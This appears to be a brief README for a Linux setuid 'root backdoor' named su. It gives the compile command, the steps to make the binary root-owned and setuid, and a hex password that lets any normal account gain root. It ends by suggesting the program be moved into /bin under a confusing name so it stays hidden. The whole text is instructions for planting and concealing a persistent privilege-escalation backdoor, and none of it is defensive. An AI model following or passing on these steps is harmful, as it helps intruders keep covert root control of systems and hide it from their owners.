# su

root backdoor for suid

Compile：
gcc -O2 -Wall -Wextra -o su su.c

Execute the execution with the root account：

```
    sudo chown root:root su
    sudo chmod u+s su
```

After that, you can use a normal account to get root privileges

```
  ./su 88e280e118c459ada723c50625d172c9
```

You can move the program to the /bin directory and change it to a more confusing name.
